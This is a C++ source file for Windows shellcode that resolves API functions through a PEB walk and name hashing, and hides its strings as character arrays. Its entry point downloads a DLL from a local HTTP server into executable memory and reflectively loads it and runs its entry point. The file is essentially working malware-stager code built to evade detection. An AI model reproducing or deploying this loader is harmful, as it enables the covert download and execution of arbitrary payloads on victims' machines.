

#include "Common.hpp"
#include "Structs.hpp"


#define GetKernel32() xGetModuleHandle(HASH("KERNEL32.DLL"))

FUNC void log_fn(const char* format, ...) {
    HMODULE hKernel32 = xGetModuleHandle(HASH("KERNEL32.DLL"));
    if (!hKernel32) return;

    typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)XgetProcAddress(hKernel32, HASH("LoadLibraryA"));
    if (!pLoadLibraryA) return;

    HMODULE hMsvcrt = pLoadLibraryA("msvcrt.dll");
    if (!hMsvcrt) return;
    typedef int(__cdecl* VSNPRINTF)(char*, size_t, const char*, va_list);
    VSNPRINTF pVsnprintf = (VSNPRINTF)XgetProcAddress(hMsvcrt, HASH("vsnprintf"));
    if (!pVsnprintf) return;

    HMODULE hUser32 = pLoadLibraryA("User32.dll");
    typedef int(WINAPI* MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
    MESSAGEBOXA pMessageBoxA = (MESSAGEBOXA)XgetProcAddress(hUser32, HASH("MessageBoxA"));
    if (!pMessageBoxA) return;

    char buffer[1024];
    va_list args;
    va_start(args, format);
    pVsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    pMessageBoxA(NULL, buffer, "Log Message", MB_OK | MB_ICONINFORMATION);
}




FUNC HMODULE xGetModuleHandle(DWORD64 HASH) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY head = peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head.Flink;
    auto ExeModule = current->Blink;

    current = current->Flink->Flink;
    LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)(current);
    // return (HMODULE)(DWORD64)(entry->DllBase);

    while (current != ExeModule) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)(DWORD64)((DWORD64)current);
        auto dll_hash = HASH(entry->BaseDllName.Buffer);
        if (dll_hash == HASH) {
            return (HMODULE)entry->DllBase;
        }
        current = current->Flink;
    }

    return NULL;
}

FUNC void* memset(void* dst, int val, size_t size) {
    uint8_t* p = (uint8_t*)dst;
    while (size--) {
        *p++ = (uint8_t)val;
    }
    return dst;
}



FUNC void* XgetProcAddress(void* moduleBase, DWORD64 Hash) {
    uint8_t* base = (uint8_t*)moduleBase;
    uint32_t peOffset = *(uint32_t*)(base + 0x3C);
    uint8_t* peHeader = base + peOffset;
    uint32_t exportRVA = *(uint32_t*)(peHeader + 0x88);
    if (!exportRVA) return NULL;

    uint8_t* exportDir = base + exportRVA;
    uint32_t namesRVA = *(uint32_t*)(exportDir + 0x20);
    uint32_t ordinalsRVA = *(uint32_t*)(exportDir + 0x24);
    uint32_t funcsRVA = *(uint32_t*)(exportDir + 0x1C);
    uint32_t numNames = *(uint32_t*)(exportDir + 0x18);

    uint32_t* names = (uint32_t*)(base + namesRVA);
    uint16_t* ordinals = (uint16_t*)(base + ordinalsRVA);
    uint32_t* functions = (uint32_t*)(base + funcsRVA);

    for (uint32_t i = 0; i < numNames; i++) {
        const char* funcName = (const char*)(base + names[i]);

        if (HASH(funcName) == Hash) {
            uint16_t ordinal = ordinals[i];
            uint32_t funcRVA = functions[ordinal];
            return (void*)(base + funcRVA);
        }
    }

    return NULL;
}

FUNC void* memcpy(void* dest, const void* src, size_t count) {
    char* dst8 = (char*)dest;
    const char* src8 = (const char*)src;
    while (count--) {
        *dst8++ = *src8++;
    }
    return dest;
}

FUNC void __chkstk() {}

FUNC DWORD_PTR LoadLibraryInMemory(LPVOID lpDllBuffer) {




    char loadLibStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
    char getModuleStr[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0' };
    char virtualAllocStr[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','\0' };
    char GetProcStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };


    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) return 0;

    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress(hKernel32, HASH(virtualAllocStr));
    if (!VirtualAlloc_) return 0;

    pGetProcAddress GetProcAddress_ = (pGetProcAddress)XgetProcAddress(hKernel32, HASH(GetProcStr));
    fnGetModuleHandleA GetModuleHandleA_ = (fnGetModuleHandleA)XgetProcAddress(hKernel32, HASH(getModuleStr));
    pLoadLibraryA LoadLibraryA_ = (pLoadLibraryA)XgetProcAddress(hKernel32, HASH(loadLibStr));


    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpDllBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpDllBuffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

    LPVOID lpBaseAddress = VirtualAlloc_(
        (LPVOID)(pNtHeaders->OptionalHeader.ImageBase),
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    if (!lpBaseAddress) {
        lpBaseAddress = VirtualAlloc_(
            NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!lpBaseAddress) return 0;
    }

    memcpy(lpBaseAddress, lpDllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (LPVOID)((DWORD_PTR)lpBaseAddress + pSectionHeader[i].VirtualAddress);
        LPVOID src = (LPVOID)((DWORD_PTR)lpDllBuffer + pSectionHeader[i].PointerToRawData);
        memcpy(dest, src, pSectionHeader[i].SizeOfRawData);
    }

    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)lpBaseAddress + pImportDir->VirtualAddress);
        while (pImportDesc->Name) {
            LPCSTR pModuleName = (LPCSTR)((DWORD_PTR)lpBaseAddress + pImportDesc->Name);
            HMODULE hImportModule = (HMODULE)GetModuleHandleA_(pModuleName);
            if (!hImportModule) hImportModule = LoadLibraryA_(pModuleName);
            if (!hImportModule) return 0;

            PIMAGE_THUNK_DATA pOrigThunk = pImportDesc->OriginalFirstThunk ?
                (PIMAGE_THUNK_DATA)((DWORD_PTR)lpBaseAddress + pImportDesc->OriginalFirstThunk) :
                (PIMAGE_THUNK_DATA)((DWORD_PTR)lpBaseAddress + pImportDesc->FirstThunk);

            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD_PTR)lpBaseAddress + pImportDesc->FirstThunk);

            while (pOrigThunk->u1.AddressOfData) {
                FARPROC procAddr;
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) {
                    procAddr = (FARPROC)GetProcAddress_(hImportModule, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)lpBaseAddress + pOrigThunk->u1.AddressOfData);
                    procAddr = (FARPROC)GetProcAddress_(hImportModule, pImport->Name);
                }
                if (!procAddr) return 0;

                pIAT->u1.Function = (DWORD_PTR)procAddr;
                ++pOrigThunk;
                ++pIAT;
            }
            ++pImportDesc;
        }
    }

    DWORD_PTR delta = (DWORD_PTR)lpBaseAddress - pNtHeaders->OptionalHeader.ImageBase;
    if (delta && pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpBaseAddress +
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while (pReloc->SizeOfBlock) {
            DWORD numRelocs = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocData = (PWORD)(pReloc + 1);
            for (DWORD i = 0; i < numRelocs; i++) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD_PTR* pPatch = (DWORD_PTR*)((DWORD_PTR)lpBaseAddress + pReloc->VirtualAddress + offset);
                    *pPatch += delta;
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pReloc + pReloc->SizeOfBlock);
        }
    }

    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        pDllMain DllMain = (pDllMain)((DWORD_PTR)lpBaseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        __asm {int3};
        DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL);
        if (!DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL)) {
            return 0;
        }
    }

    return (DWORD_PTR)lpBaseAddress;
}

FUNC_STR
void __declspec(noreturn) _start() {


    char loadLibStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
    char getModuleStr[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0' };
    char wininetStr[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char virtualAllocStr[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','\0' };
    char exitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s','\0' };
    char internetOpenStr[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A','\0' };
    char internetOpenUrlStr[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0' };
    char internetReadStr[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0' };
    char internetCloseStr[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0' };
    char agentStr[] = { 'a','g','e','n','t','\0' };
    char url[] = { 'h','t','t','p',':','/','/','1','2','7','.','0','.','0','.','1',':','5','0','0','0','/','g','e','t','D','L','L','\0' };
    char kernel32Str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };

    HMODULE hKernel32 = GetKernel32();
    fnGetModuleHandleA LoadLibraryA_ = (fnGetModuleHandleA)XgetProcAddress((HINSTANCE)hKernel32, HASH(loadLibStr));
    //pLoadLibraryA GetModuleHandleA_ = (pLoadLibraryA)XgetProcAddress((HINSTANCE)hKernel32, getModuleStr);

    HMODULE hWininet = (HMODULE)LoadLibraryA_(wininetStr);

    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress((HINSTANCE)hKernel32, HASH(virtualAllocStr));
    pExitProcess ExitProcess_ = (pExitProcess)XgetProcAddress((HINSTANCE)hKernel32, HASH(exitProcessStr));

    pInternetOpenA InternetOpenA_ = (pInternetOpenA)XgetProcAddress((HINSTANCE)hWininet, HASH(internetOpenStr));
    pInternetOpenUrlA InternetOpenUrlA_ = (pInternetOpenUrlA)XgetProcAddress((HINSTANCE)hWininet, HASH(internetOpenUrlStr));
    pInternetReadFile InternetReadFile_ = (pInternetReadFile)XgetProcAddress((HINSTANCE)hWininet, HASH(internetReadStr));
    pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)XgetProcAddress((HINSTANCE)hWininet, HASH(internetCloseStr));

    HINTERNET hInternet = InternetOpenA_(agentStr, 1, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlA_(hInternet, url, NULL, 0, 0, 0);

    BYTE* pBuffer = (BYTE*)VirtualAlloc_(NULL, 0x100000, 0x1000 | 0x2000, 0x40);
    DWORD total = 0, read = 0;

    while (InternetReadFile_(hFile, pBuffer + total, 4096, &read) && read > 0) {
        total += read;
    }

    InternetCloseHandle_(hFile);
    InternetCloseHandle_(hInternet);
    //__asm{int3};
    LoadLibraryInMemory(pBuffer);

    ExitProcess_(0);
}

